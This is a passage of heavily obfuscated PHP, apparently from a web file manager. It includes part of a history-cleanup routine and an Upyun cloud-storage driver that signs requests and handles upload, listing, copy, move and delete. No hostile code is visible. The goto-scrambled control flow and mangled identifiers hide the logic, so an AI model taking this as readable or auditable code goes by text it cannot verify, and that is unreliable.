self::log($BÙõ©Š°¬Û[1111] . $DÖ“Š£‰ÁØ . $BÙõ©Š°¬Û[67] . count($EÊĞÂ½ŒµŒ), $BÙõ©Š°¬Û[707]); if ($EÊĞÂ½ŒµŒ) { return IO::setContent($DÖ“Š£‰ÁØ, json_encode($EÊĞÂ½ŒµŒ)); } goto AÌ³À´Î´Å; DÙ—¾Ô¬¯: return !0; goto BÇŞÆ…‰«Ü; BÇŞÆ…‰«Ü: } public static function clearEmptyFolder($f‰ù¤Ä¯) { goto ašÊòãôŠ; ašÊòãôŠ: $D¥õÃù¢¿† =& $_SERVER[¹…ÕÄ]; if (trim($f‰ù¤Ä¯, $D¥õÃù¢¿†[8]) == trim(self::$_historyBase, $D¥õÃù¢¿†[8])) { return; } $bçÊ¯ßêŸ = IO::pathFather($f‰ù¤Ä¯); goto E”óÜë‘ÉÄ; b†‰Ş»ô×Æ: self::clearEmptyFolder($bçÊ¯ßêŸ); goto bÍ‚Ô¹í”×; E”óÜë‘ÉÄ: $F‰Ÿîßœš = IO::has($f‰ù¤Ä¯, !0); if ($F‰Ÿîßœš[$D¥õÃù¢¿†[201]] > 0 || $F‰Ÿîßœš[$D¥õÃù¢¿†[202]] > 0) { return; } IO::remove($f‰ù¤Ä¯); goto b†‰Ş»ô×Æ; bÍ‚Ô¹í”×: } private static function getBasePath() { goto f’”Ï½Ìˆ; CÙÌœëÎé›: file_put_contents($BÃ®¢Â…ï . $Cä×ùõ°àŠ[1115], $Cä×ùõ°àŠ[33]); Model($Cä×ùõ°àŠ[1112])->set($Cä×ùõ°àŠ[1113], $BÃ®¢Â…ï); return $BÃ®¢Â…ï; goto c´ë¦Â§ëø; f’”Ï½Ìˆ: $Cä×ùõ°àŠ =& $_SERVER[¹…ÕÄ]; $BÃ®¢Â…ï = Model($Cä×ùõ°àŠ[1112])->get($Cä×ùõ°àŠ[1113]); if (IO::exist($BÃ®¢Â…ï)) { return $BÃ®¢Â…ï; } goto CˆßßÙÅ¤Å; CˆßßÙÅ¤Å: $BÃ®¢Â…ï = DATA_PATH . $Cä×ùõ°àŠ[1114]; $BÃ®¢Â…ï = IO::mkdir($BÃ®¢Â…ï); $BÃ®¢Â…ï = rtrim($BÃ®¢Â…ï, $Cä×ùõ°àŠ[8]) . $Cä×ùõ°àŠ[8]; goto CÙÌœëÎé›; c´ë¦Â§ëø: } } $Fá˜‚ÖÊÈô = $_SERVER[$_SERVER[¹…ÕÄ][811]]; $DÜŞëääñ“ = $_SERVER[¹…ÕÄ][812]; goto BëÙİ™ŠÏù; Câà…ĞĞ¦: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\57\x2f\x76\60\x2e\x61\160\x69\x2e\x75\160\x79\x75\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($e‚Ù»§ÖšÔ) { parent::__construct(); $this->_init($e‚Ù»§ÖšÔ); } public function _init($CËËÂˆŸÌ) { $DÏëÎÎî¯ =& $_SERVER[¹…ÕÄ]; foreach ($CËËÂˆŸÌ as $DÛ½¥·’˜‡ => $BÇ¦”ĞçĞ¿) { if (isset($this->{$DÛ½¥·’˜‡})) { $this->{$DÛ½¥·’˜‡} = $BÇ¦”ĞçĞ¿; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($DÏëÎÎî¯[1307] . LNG($DÏëÎÎî¯[1238])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($dÕòõ·™ŞŞ, $E‹­åˆÉŒ = "\107\105\124") { $bæ×Ë¡•º– =& $_SERVER[¹…ÕÄ]; $FçÌÇ·Áï˜ = gmdate($bæ×Ë¡•º–[1272]); $b¢¤‚ñ¤‡Å = base64_encode(hash_hmac($bæ×Ë¡•º–[1308], "{$E‹­åˆÉŒ}\46{$dÕòõ·™ŞŞ}\x26{$FçÌÇ·Áï˜}", md5("{$this->userpass}"), !0)); $cö‹­ö¡‡ = array("\x41\165\x74\x68\157\x72\x69\172\141\x74\x69\x6f\x6e\72\125\120\x59\x55\x4e\40{$this->username}\72{$b¢¤‚ñ¤‡Å}", "\104\141\164\x65\x3a{$FçÌÇ·Áï˜}"); return $cö‹­ö¡‡; } public function ussRequest($bØÏ·¯ß„, $DÀİ×ÄÆñ¯ = "\107\x45\x54", $c°Ç‚ìÍ´ = false, $b³‚Ÿ½ËòŸ = false, $e¼Ã˜–æ¡ç = false) { goto AÊìãáš­ß; d–‹­·ÄÖœ: $C‚“ãŞÍ¨ = $this->ussHeaders($fŸÀŒ˜äÔ, $DÀİ×ÄÆñ¯); if ($b³‚Ÿ½ËòŸ) { $C‚“ãŞÍ¨ = array_merge($C‚“ãŞÍ¨, $b³‚Ÿ½ËòŸ); } $B‹Ó¡§½Ú¾ = url_request($this->endpoint . $fŸÀŒ˜äÔ, $DÀİ×ÄÆñ¯, $c°Ç‚ìÍ´, $C‚“ãŞÍ¨, $e¼Ã˜–æ¡ç); goto EÔÖÛ‹ËçØ; EÔÖÛ‹ËçØ: if (!$B‹Ó¡§½Ú¾) { return array($AìêÑ¡ŸšÜ[1064] => !1, $AìêÑ¡ŸšÜ[1066] => $AìêÑ¡ŸšÜ[1309]); } if (strtolower($DÀİ×ÄÆñ¯) == $AìêÑ¡ŸšÜ[190] || in_array($B‹Ó¡§½Ú¾[$AìêÑ¡ŸšÜ[1064]], array($AìêÑ¡ŸšÜ[1166], $AìêÑ¡ŸšÜ[1310]))) { $c°Ç‚ìÍ´ = $B‹Ó¡§½Ú¾[$AìêÑ¡ŸšÜ[1311]]; } else { $c°Ç‚ìÍ´ = json_decode($B‹Ó¡§½Ú¾[$AìêÑ¡ŸšÜ[1066]], !0); if (!$c°Ç‚ìÍ´) { $c°Ç‚ìÍ´ = $B‹Ó¡§½Ú¾[$AìêÑ¡ŸšÜ[1066]]; } else { if (!$B‹Ó¡§½Ú¾[$AìêÑ¡ŸšÜ[705]] && isset($c°Ç‚ìÍ´[$AìêÑ¡ŸšÜ[1312]])) { $c°Ç‚ìÍ´ = $c°Ç‚ìÍ´[$AìêÑ¡ŸšÜ[1312]]; } } } return array($AìêÑ¡ŸšÜ[1064] => $B‹Ó¡§½Ú¾[$AìêÑ¡ŸšÜ[705]], $AìêÑ¡ŸšÜ[1066] => $c°Ç‚ìÍ´); goto cÆÉ“ğİæ; AÊìãáš­ß: $AìêÑ¡ŸšÜ =& $_SERVER[¹…ÕÄ]; $bØÏ·¯ß„ = trim($bØÏ·¯ß„, $AìêÑ¡ŸšÜ[8]); $fŸÀŒ˜äÔ = "\57{$this->bucket}\x2f{$bØÏ·¯ß„}"; goto d–‹­·ÄÖœ; cÆÉ“ğİæ: } public function mkfile($a•£İÑ¡ŠÛ, $D•èáè¦Šò = '', $EçµŠ§¢½ = REPEAT_RENAME) { if ($this->setContent($a•£İÑ¡ŠÛ, $D•èáè¦Šò)) { return $this->getPathOuter($a•£İÑ¡ŠÛ); } return !1; } public function mkdir($FŞ–ÜèİŸ, $fë¾¯‘ÑÛ› = REPEAT_SKIP) { $BóĞ–‹Éä® =& $_SERVER[¹…ÕÄ]; $c“·šßì˜Ñ = trim($FŞ–ÜèİŸ, $BóĞ–‹Éä®[8]); if ($this->_isFolder($c“·šßì˜Ñ)) { return $this->getPathOuter($c“·šßì˜Ñ); } $fåÌÖùøŠ = array($BóĞ–‹Éä®[1313]); $F™õ¶°×•‰ = $this->ussRequest($c“·šßì˜Ñ, $BóĞ–‹Éä®[222], !1, $fåÌÖùøŠ); return $F™õ¶°×•‰[$BóĞ–‹Éä®[1064]] ? $this->getPathOuter($c“·šßì˜Ñ) : !1; } public function copyFile($A¥¯Ï…åßœ, $Fˆ¤»ÛšÕß) { $a‘—ôãÆù› =& $_SERVER[¹…ÕÄ]; $BÇÊòÂŸ¤¥ = array($a‘—ôãÆù›[1314] . "\x2f{$this->bucket}\x2f{$A¥¯Ï…åßœ}", $a‘—ôãÆù›[1315]); $AÛËÁ¸§»Ç = $this->ussRequest($Fˆ¤»ÛšÕß, $a‘—ôãÆù›[224], !1, $BÇÊòÂŸ¤¥); return $AÛËÁ¸§»Ç[$a‘—ôãÆù›[1064]] ? !0 : $this->getPathOuter($Fˆ¤»ÛšÕß); } public function moveFile($AÌâáéé™, $fÀ˜î»º) { $dÌ¥‚§«‘í =& $_SERVER[¹…ÕÄ]; $CÉÍ¸°Ç = array($dÌ¥‚§«‘í[1316] . "\x2f{$this->bucket}\x2f{$AÌâáéé™}", $dÌ¥‚§«‘í[1315]); $BÊ¼Á×‚Ï¯ = $this->ussRequest($fÀ˜î»º, $dÌ¥‚§«‘í[224], !1, $CÉÍ¸°Ç); return $BÊ¼Á×‚Ï¯[$dÌ¥‚§«‘í[1064]] ? !0 : $this->getPathOuter($fÀ˜î»º); } public function delFile($A›»Ò™†–å) { $fñ›” À½’ =& $_SERVER[¹…ÕÄ]; $E÷øøº°Ïì = $this->ussRequest($A›»Ò™†–å, $fñ›” À½’[1317]); return $E÷øøº°Ïì[$fñ›” À½’[1064]] ? !0 : !1; } public function delFolder($A£†Óˆ¸ìª) { goto bÏêœƒµ¦Ä; FÂ¶è¿ˆÃÁ: $BŒ¢ãğÙ§Á = $BÂªõ‘–Ş = array(); $this->fileList($A£†Óˆ¸ìª, $BŒ¢ãğÙ§Á, $BÂªõ‘–Ş, !0); $this->listItemCache = !0; goto C‹î–Ÿª‰â; fÁ£Í®ƒ†: return $DíÈÍ¢¢ß«[$F¬¼³¨í²[1064]]; goto CÏµº‰£İ; C‹î–Ÿª‰â: foreach ($BÂªõ‘–Ş as $fã°è„Ï…) { $DíÈÍ¢¢ß« = $this->ussRequest($fã°è„Ï…[$F¬¼³¨í²[28]], $F¬¼³¨í²[1317]); if (!$DíÈÍ¢¢ß«[$F¬¼³¨í²[1064]]) { return !1; } } foreach ($BŒ¢ãğÙ§Á as $FôÌ¨‡èîõ) { $DíÈÍ¢¢ß« = $this->ussRequest($FôÌ¨‡èîõ, $F¬¼³¨í²[1317]); if (!$DíÈÍ¢¢ß«[$F¬¼³¨í²[1064]]) { return !1; } } $DíÈÍ¢¢ß« = $this->ussRequest($A£†Óˆ¸ìª, $F¬¼³¨í²[1317]); goto fÁ£Í®ƒ†; bÏêœƒµ¦Ä: $F¬¼³¨í² =& $_SERVER[¹…ÕÄ]; if (!$this->exist($A£†Óˆ¸ìª)) { return !0; } $this->listItemCache = !1; goto FÂ¶è¿ˆÃÁ; CÏµº‰£İ: } public function rename($f·¦Ù¼‰Û, $aéí™íÆ·–) { if ($this->isFile($f·¦Ù¼‰Û)) { $aéí™íÆ·– = get_path_father($f·¦Ù¼‰Û) . $aéí™íÆ·–; return $this->moveFile($f·¦Ù¼‰Û, $aéí™íÆ·–); } return $this->renameObject($f·¦Ù¼‰Û, $aéí™íÆ·–); } public function fileInfo($C¬«Õ¸Ü’•, $E¼“ÜÔ¸ÜÒ = false, $fáÀÁ¦­ = array()) { goto dµ•²…‰©›; dµ•²…‰©›: $CãˆçõŠ½Š =& $_SERVER[¹…ÕÄ]; $aÏŠ˜ˆšÇì = array($CãˆçõŠ½Š[28] => $this->pathThis($C¬«Õ¸Ü’•), $CãˆçõŠ½Š[75] => $this->getPathOuter($CãˆçõŠ½Š[8] . $C¬«Õ¸Ü’•), $CãˆçõŠ½Š[29] => $CãˆçõŠ½Š[173], $CãˆçõŠ½Š[77] => isset($fáÀÁ¦­[$CãˆçõŠ½Š[77]]) ? $fáÀÁ¦­[$CãˆçõŠ½Š[77]] : 0, $CãˆçõŠ½Š[167] => $this->ext($C¬«Õ¸Ü’•)); if ($E¼“ÜÔ¸ÜÒ) { return $aÏŠ˜ˆšÇì; } goto bËŸ¾‚¦»£; dÖİƒ…šÉÀ: return $aÏŠ˜ˆšÇì; goto CÒÔ¬õøµô; bËŸ¾‚¦»£: $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[192]] = $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[83]] = 0; $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[193]] = $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[194]] = !0; if (empty($fáÀÁ¦­)) { $fáÀÁ¦­ = $this->objectMeta($C¬«Õ¸Ü’•); if (!$fáÀÁ¦­) { return $aÏŠ˜ˆšÇì; } } goto Cå¤ì¡Àº; Cå¤ì¡Àº: $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[192]] = intval($fáÀÁ¦­[$CãˆçõŠ½Š[1318]]); $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[83]] = intval($fáÀÁ¦­[$CãˆçõŠ½Š[1319]]); $aÏŠ˜ˆšÇì[$CãˆçõŠ½Š[77]] = $fáÀÁ¦­[$CãˆçõŠ½Š[77]]; goto dÖİƒ…šÉÀ; CÒÔ¬õøµô: } public function folderInfo($eøÔç÷Íİ, $cÑ«“ÀŸ•‹ = false) { goto EÈ±İİîĞ; Dá‘†â‹…ˆ: $aÏ…£‚ ®Œ[$FİµĞîŸçæ[192]] = intval($e¸º·²ëç…[$FİµĞîŸçæ[1318]]); $aÏ…£‚ ®Œ[$FİµĞîŸçæ[83]] = intval($e¸º·²ëç…[$FİµĞîŸçæ[1319]]); return $aÏ…£‚ ®Œ; goto Fë¬å¦¤Ò; báß ÈÖå˜: $aÏ…£‚ ®Œ[$FİµĞîŸçæ[192]] = $aÏ…£‚ ®Œ[$FİµĞîŸçæ[83]] = 0; $aÏ…£‚ ®Œ[$FİµĞîŸçæ[193]] = $aÏ…£‚ ®Œ[$FİµĞîŸçæ[194]] = !0; if (empty($e¸º·²ëç…)) { $e¸º·²ëç… = $this->objectMeta($eøÔç÷Íİ); if (!$e¸º·²ëç…) { return $aÏ…£‚ ®Œ; } } goto Dá‘†â‹…ˆ; EÈ±İİîĞ: $FİµĞîŸçæ =& $_SERVER[¹…ÕÄ]; $aÏ…£‚ ®Œ = array($FİµĞîŸçæ[28] => $this->pathThis($eøÔç÷Íİ), $FİµĞîŸçæ[75] => $this->getPathOuter($FİµĞîŸçæ[8] . $eøÔç÷Íİ), $FİµĞîŸçæ[29] => $FİµĞîŸçæ[76]); if ($cÑ«“ÀŸ•‹) { return $aÏ…£‚ ®Œ; } goto báß ÈÖå˜; Fë¬å¦¤Ò: } private function listObjs($fŠ´ æ¬¶, $Côï¡…£½é = 0, $F¸¦ÁéÍ” = 1000) { $aÏÊ—Ñª¶‡ =& $_SERVER[¹…ÕÄ]; $B±îÎÑë„„ = array($aÏÊ—Ñª¶‡[1320], $aÏÊ—Ñª¶‡[1321] . $F¸¦ÁéÍ”); if ($Côï¡…£½é) { $B±îÎÑë„„[] = $aÏÊ—Ñª¶‡[1322] . $Côï¡…£½é; } $fäÒĞŠÈÑ‰ = $this->ussRequest($fŠ´ æ¬¶, $aÏÊ—Ñª¶‡[226], !1, $B±îÎÑë„„); return !$fäÒĞŠÈÑ‰[$aÏÊ—Ñª¶‡[1064]] ? !1 : $fäÒĞŠÈÑ‰[$aÏÊ—Ñª¶‡[1066]]; } private function fileList($d­¹çæ, &$BŸ©Ğã©Ì×, &$fâÁ–Ø…‡, $A²”³Ø¸¹Æ = false) { goto d¬—ƒõ°õ¹; e‹ŒğÛ×Üˆ: if ($Fó¹ÄÍ Î‚) { $this->cacheMethod($e‰éÇ‘Ç‰Â[197], $d­¹çæ, !0); } goto D³Ü°„è‘; B±İ˜‘§İç: $e‡÷ÏŞùÒ = rtrim($d­¹çæ, $e‰éÇ‘Ç‰Â[8]) . $e‰éÇ‘Ç‰Â[8]; $Fó¹ÄÍ Î‚ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $C·’Ü¹ñ¤¼ = $this->listObjs($d­¹çæ, $a‰šÎôöÈ, $A…Ğ¢Àö); if (!$C·’Ü¹ñ¤¼) { return !1; } $a‰šÎôöÈ = isset($C·’Ü¹ñ¤¼[$e‰éÇ‘Ç‰Â[1323]]) ? $C·’Ü¹ñ¤¼[$e‰éÇ‘Ç‰Â[1323]] : $e‰éÇ‘Ç‰Â[33]; $c†Êï™„Î¦ = isset($C·’Ü¹ñ¤¼[$e‰éÇ‘Ç‰Â[1324]]) ? $C·’Ü¹ñ¤¼[$e‰éÇ‘Ç‰Â[1324]] : array(); foreach ($c†Êï™„Î¦ as $B¡ó‘ˆùèÒ) { $e„¸ç»Üğ‹ = $B¡ó‘ˆùèÒ[$e‰éÇ‘Ç‰Â[29]] == $e‰éÇ‘Ç‰Â[76] ? !0 : !1; $dÌ˜Õª¯ù = ltrim($e‡÷ÏŞùÒ . $B¡ó‘ˆùèÒ[$e‰éÇ‘Ç‰Â[28]], $e‰éÇ‘Ç‰Â[8]) . ($e„¸ç»Üğ‹ ? $e‰éÇ‘Ç‰Â[8] : $e‰éÇ‘Ç‰Â[33]); $eñ¿¡§‘¦§ = array($e‰éÇ‘Ç‰Â[28] => $dÌ˜Õª¯ù, $e‰éÇ‘Ç‰Â[29] => $e„¸ç»Üğ‹ ? $e‰éÇ‘Ç‰Â[76] : $e‰éÇ‘Ç‰Â[173], $e‰éÇ‘Ç‰Â[77] => $B¡ó‘ˆùèÒ[$e‰éÇ‘Ç‰Â[333]], $e‰éÇ‘Ç‰Â[1319] => $B¡ó‘ˆùèÒ[$e‰éÇ‘Ç‰Â[1325]]); if ($Fó¹ÄÍ Î‚) { $this->cacheMethod($e‰éÇ‘Ç‰Â[197], $dÌ˜Õª¯ù, $e„¸ç»Üğ‹); $this->cacheMethod($e‰éÇ‘Ç‰Â[198], $dÌ˜Õª¯ù, $eñ¿¡§‘¦§); } if ($e„¸ç»Üğ‹) { $BŸ©Ğã©Ì×[] = $dÌ˜Õª¯ù; if ($A²”³Ø¸¹Æ) { $this->fileList($dÌ˜Õª¯ù, $BŸ©Ğã©Ì×, $fâÁ–Ø…‡, $A²”³Ø¸¹Æ); } continue; } $fâÁ–Ø…‡[] = $eñ¿¡§‘¦§; } if (count($c†Êï™„Î¦) < $A…Ğ¢Àö) { break; } } goto e‹ŒğÛ×Üˆ; d¬—ƒõ°õ¹: $e‰éÇ‘Ç‰Â =& $_SERVER[¹…ÕÄ]; $a‰šÎôöÈ = $e‰éÇ‘Ç‰Â[33]; $A…Ğ¢Àö = 1000; goto B±İ˜‘§İç; D³Ü°„è‘: } public function listPath($Dœ¾øµ§Æ³, $aÏÙì²‡£Ò = false) { $cô¾îœÀÑ‚ =& $_SERVER[¹…ÕÄ]; $Dø“ÇÛ¸‰Â = $eÓ…¢É²¸Ö = array(); $this->fileList($Dœ¾øµ§Æ³, $Dø“ÇÛ¸‰Â, $eÓ…¢É²¸Ö); foreach ($Dø“ÇÛ¸‰Â as $Aõ·ºá¦Ÿ‡ => $c’¶Š‰øŒ¯) { $Dø“ÇÛ¸‰Â[$Aõ·ºá¦Ÿ‡] = $this->folderInfo($c’¶Š‰øŒ¯, $aÏÙì²‡£Ò); } foreach ($eÓ…¢É²¸Ö as $Aõ·ºá¦Ÿ‡ => $c’¶Š‰øŒ¯) { $eÓ…¢É²¸Ö[$Aõ·ºá¦Ÿ‡] = $this->fileInfo($c’¶Š‰øŒ¯[$cô¾îœÀÑ‚[28]], $aÏÙì²‡£Ò, $c’¶Š‰øŒ¯); } return array($cô¾îœÀÑ‚[74] => $Dø“ÇÛ¸‰Â, $cô¾îœÀÑ‚[73] => $eÓ…¢É²¸Ö); } public function has($eì×ÄğäØ¡, $fÓğµ©¶Û§ = false, $dµÖñİ¸¬¢ = true) { goto Cš‘ØßäÇ; F˜ƒæ§ô¹: $Fó¯«Å©ó¹ = 0; $bÎöôˆ”÷´ = 0; $aÎÎÔ£‚µ“ = rtrim($eì×ÄğäØ¡, $f“Áœ‰ğŒ[8]) . $f“Áœ‰ğŒ[8]; goto E¦¶™Æ‚†ê; E¦¶™Æ‚†ê: while (!0) { check_abort(); $bëĞˆç¥¸¦ = $this->listObjs($eì×ÄğäØ¡, $a”µœ«ôí, $DŒè’Ä¯Œ„); if (!$bëĞˆç¥¸¦) { return !1; } $a”µœ«ôí = isset($bëĞˆç¥¸¦[$f“Áœ‰ğŒ[1323]]) ? $bëĞˆç¥¸¦[$f“Áœ‰ğŒ[1323]] : $f“Áœ‰ğŒ[33]; $cµÅ½ô› = isset($bëĞˆç¥¸¦[$f“Áœ‰ğŒ[1324]]) ? $bëĞˆç¥¸¦[$f“Áœ‰ğŒ[1324]] : array(); if (empty($cµÅ½ô›)) { break; } $BŠ¾´øÀÚé = array_filter($cµÅ½ô›, function ($F«ÓÄíôë) { $AÀ÷¯Ûô“Í =& $_SERVER[¹…ÕÄ]; return $F«ÓÄíôë[$AÀ÷¯Ûô“Í[29]] == $AÀ÷¯Ûô“Í[76]; }); $FÚœöÆ°õ = count($cµÅ½ô›); $BŠ¾´øÀÚé = count($BŠ¾´øÀÚé); $D›š¢ã¼Ğ£ = $FÚœöÆ°õ - $BŠ¾´øÀÚé; if ($fÓğµ©¶Û§) { $bÎöôˆ”÷´ += $BŠ¾´øÀÚé; $Fó¯«Å©ó¹ += $D›š¢ã¼Ğ£; if ($FÚœöÆ°õ < $DŒè’Ä¯Œ„) { break; } continue; } if ($dµÖñİ¸¬¢) { if ($D›š¢ã¼Ğ£) { return !0; } } else { if ($BŠ¾´øÀÚé) { return !0; } } if ($FÚœöÆ°õ < $DŒè’Ä¯Œ„) { break; } } if ($fÓğµ©¶Û§) { return array($f“Áœ‰ğŒ[201] => $Fó¯«Å©ó¹, $f“Áœ‰ğŒ[202] => $bÎöôˆ”÷´); } return !1; goto cìï‚²¨Šæ; Cš‘ØßäÇ: $f“Áœ‰ğŒ =& $_SERVER[¹…ÕÄ]; $a”µœ«ôí = $f“Áœ‰ğŒ[33]; $DŒè’Ä¯Œ„ = 500; goto F˜ƒæ§ô¹; cìï‚²¨Šæ: } public function listAll($FöÕñº¾«) { goto Cñó‚ª¼; BÆ˜ïª: return $this->listAllFiles($FöÕñº¾«, array_keys($BÆµõì‰‡), $BÆµõì‰‡); goto eß¸­„¾¤; Cñó‚ª¼: $B©ï½µÇ†Ì =& $_SERVER[¹…ÕÄ]; $F˜Ñé˜¿‹À = $F«äã¬»¹‰ = array(); $this->fileList($FöÕñº¾«, $F˜Ñé˜¿‹À, $F«äã¬»¹‰, !0); goto fîÈøßâ«ë; fîÈøßâ«ë: $BÆµõì‰‡ = array(); foreach ($F«äã¬»¹‰ as $AØÆÂ·´”«) { $BÆµõì‰‡[$AØÆÂ·´”«[$B©ï½µÇ†Ì[28]]] = $AØÆÂ·´”«[$B©ï½µÇ†Ì[77]]; } foreach ($F˜Ñé˜¿‹À as $AØÆÂ·´”«) { if (is_string($AØÆÂ·´”«)) { $BÆµõì‰‡[$AØÆÂ·´”«] = 0; } } goto BÆ˜ïª; eß¸­„¾¤: } public function canRead($Fã·»»ÜÌ) { return $this->exist($Fã·»»ÜÌ) ? !0 : !1; } public function canWrite($c¬Ó‹í…š¹) { return $this->exist($c¬Ó‹í…š¹) ? !0 : !1; } public function getContent($d¥ÒËíÜïç) { return $this->fileSubstr($d¥ÒËíÜïç, 0, -1); } public function setContent($E«²×»‰Á, $AÒŠØÌ²ô = '') { $c‰·ª§«ä =& $_SERVER[¹…ÕÄ]; if (!$AÒŠØÌ²ô) { $cÅƒöï Ëï = $this->ussRequest($E«²×»‰Á, $c‰·ª§«ä[222]); return $cÅƒöï Ëï[$c‰·ª§«ä[1064]]; } $Aá’¤º„¹ = $this->tempFile($this->pathThis($E«²×»‰Á)); file_put_contents($Aá’¤º„¹, $AÒŠØÌ²ô); if ($this->upload($E«²×»‰Á, $Aá’¤º„¹)) { $this->tempFileRemve($Aá’¤º„¹); return !0; } return !1; } public function fileSubstr($AáëÏ‹¥“ñ, $bŠ‹±¬ß²Ø, $c‰¦½ÚŞÙÑ) { $Cõ¯á˜ÈÃ„ =& $_SERVER[¹…ÕÄ]; if (!($b´¢ëÀÁçõ = $this->link($AáëÏ‹¥“ñ))) { return !1; } $Dòöµ­‰Ê· = !1; if ($c‰¦½ÚŞÙÑ > 0) { $e‘ƒã¬ßÒ” = $bŠ‹±¬ß²Ø + $c‰¦½ÚŞÙÑ - 1; $Dòöµ­‰Ê· = array($Cõ¯á˜ÈÃ„[1286] . $bŠ‹±¬ß²Ø . $Cõ¯á˜ÈÃ„[434] . $e‘ƒã¬ßÒ”); } $F‹Ş§äÅ = url_request($b´¢ëÀÁçõ, $Cõ¯á˜ÈÃ„[226], !1, $Dòöµ­‰Ê·); return $F‹Ş§äÅ[$Cõ¯á˜ÈÃ„[705]] ? $F‹Ş§äÅ[$Cõ¯á˜ÈÃ„[1066]] : !1; } public function upload($a‰»†èù×™, $dŸ˜³»İÀÖ, $Fº´£µ‚ˆ = false, $e–½¬¶¬ëˆ = REPEAT_REPLACE) { goto AÀ®Ï¢Ô¾; cÒìŠœ Šƒ: $Aõªâ†èĞĞ = $cÂµãË­¹Í[$AÂĞÉÇ›[1331]]; $a«ÆïĞè¿” = fopen($dŸ˜³»İÀÖ, $AÂĞÉÇ›[1235]); if (!$a«ÆïĞè¿”) { return !1; } goto aÛ¥’¾Ë¥; aÛ¥’¾Ë¥: do { $b¥ÚÉóä˜ = $cÂµãË­¹Í[$AÂĞÉÇ›[1332]]; fseek_64($a«ÆïĞè¿”, $aµé‘†©ò¾); $d ÇÖÃîæ’ = fread($a«ÆïĞè¿”, $b¥ÚÉóä˜); $e‘©’Ï¡¼õ = 0; do { $e‘©’Ï¡¼õ++; $cÂµãË­¹Í = $this->uploadPart($a‰»†èù×™, $cÂµãË­¹Í, $d ÇÖÃîæ’); } while (!$cÂµãË­¹Í && $e‘©’Ï¡¼õ < 3); if (!$cÂµãË­¹Í) { return !1; } $Aõªâ†èĞĞ = $cÂµãË­¹Í[$AÂĞÉÇ›[1331]]; $aµé‘†©ò¾ += $b¥ÚÉóä˜; } while ($Aõªâ†èĞĞ != -1); fclose($a«ÆïĞè¿”); $dÉÊ§†ãã = array($AÂĞÉÇ›[1333], $AÂĞÉÇ›[1334] . $cÂµãË­¹Í[$AÂĞÉÇ›[1335]], $AÂĞÉÇ›[1329]); goto aŠÈ¯ìÎ³‚; Dæ†—¬‰Êó: $c°Š…¦¹ÛÂ = 1024 * 1024 * 10; $dÉÊ§†ãã = array($AÂĞÉÇ›[1327], $AÂĞÉÇ›[1328] . $Bë™°—µ²‚, $AÂĞÉÇ›[1329], $AÂĞÉÇ›[1330] . $c°Š…¦¹ÛÂ); $C‡ĞÀîå˜¦ = $this->ussRequest($a‰»†èù×™, $AÂĞÉÇ›[224], !1, $dÉÊ§†ãã); goto A’¡ÉÔ‚‹Î; aŠÈ¯ìÎ³‚: $C‡ĞÀîå˜¦ = $this->ussRequest($a‰»†èù×™, $AÂĞÉÇ›[224], !1, $dÉÊ§†ãã); return $C‡ĞÀîå˜¦[$AÂĞÉÇ›[1064]] ? $this->getPathOuter($fÎè´Û½‡) : !1; goto CÇ´…çğ×¥; AÀ®Ï¢Ô¾: $AÂĞÉÇ› =& $_SERVER[¹…ÕÄ]; $Bë™°—µ²‚ = IO::size($dŸ˜³»İÀÖ); if ($Bë™°—µ²‚ <= 1024 * 1024 * 200) { $b®Š¥È÷ö´ = array($AÂĞÉÇ›[1326] . $dŸ˜³»İÀÖ); $C‡ĞÀîå˜¦ = $this->ussRequest($a‰»†èù×™, $AÂĞÉÇ›[224], $b®Š¥È÷ö´); return $C‡ĞÀîå˜¦[$AÂĞÉÇ›[1064]] ? $this->getPathOuter($a‰»†èù×™) : !1; } goto Dæ†—¬‰Êó; A’¡ÉÔ‚‹Î: if (!$C‡ĞÀîå˜¦[$AÂĞÉÇ›[1064]]) { return !1; } $cÂµãË­¹Í = $C‡ĞÀîå˜¦[$AÂĞÉÇ›[1066]]; $aµé‘†©ò¾ = 0; goto cÒìŠœ Šƒ; CÇ´…çğ×¥: } private function uploadPart($AøçÁÖŞã, $B§î›Œ«Î¶, &$E´İ”àèù) { $B·„¾Ùàó• =& $_SERVER[¹…ÕÄ]; $F§õÀŠ–³Ú = array($B·„¾Ùàó•[1336], $B·„¾Ùàó•[1334] . $B§î›Œ«Î¶[$B·„¾Ùàó•[1335]], $B·„¾Ùàó•[1337] . $B§î›Œ«Î¶[$B·„¾Ùàó•[1331]], $B·„¾Ùàó•[140] . $B§î›Œ«Î¶[$B·„¾Ùàó•[1332]]); $B×Äß´ùº = $this->ussRequest($AøçÁÖŞã, $B·„¾Ùàó•[224], $E´İ”àèù, $F§õÀŠ–³Ú); return !$B×Äß´ùº[$B·„¾Ùàó•[1064]] ? $B×Äß´ùº[$B·„¾Ùàó•[1064]] : $B×Äß´ùº[$B·„¾Ùàó•[1066]]; } public function uploadFormData($E™ğµ­ËÎ, $f¥¸©‹šô§ = 3600) { return $this->uploadPolicy($E™ğµ­ËÎ, $f¥¸©‹šô§); } public function multiUploadFormData($e‡“©Çñ‚Å, $d…šˆÅÕ‹ò = 3600) { $cÓŒŞÑñ =& $_SERVER[¹…ÕÄ]; $cğ§ëÉêï¶ = (int) $GLOBALS[$cÓŒŞÑñ[7]][$cÓŒŞÑñ[77]]; return $this->uploadPolicy($e‡“©Çñ‚Å, $d…šˆÅÕ‹ò, $cğ§ëÉêï¶); } private function uploadPolicy($FĞº‘É‚Ü, $e—Äá¬¢… = 3600, $BÌİÉƒÄÃ = 0) { goto eÅÀ £Ö§Ú; cÇ•†õ‘©ù: $c‘¶İÇ±„ = array($dèƒ¥ŒƒĞ®[1338] => $this->bucket, $dèƒ¥ŒƒĞ®[1339] => $FĞº‘É‚Ü, $dèƒ¥ŒƒĞ®[1340] => time() + $e—Äá¬¢…, 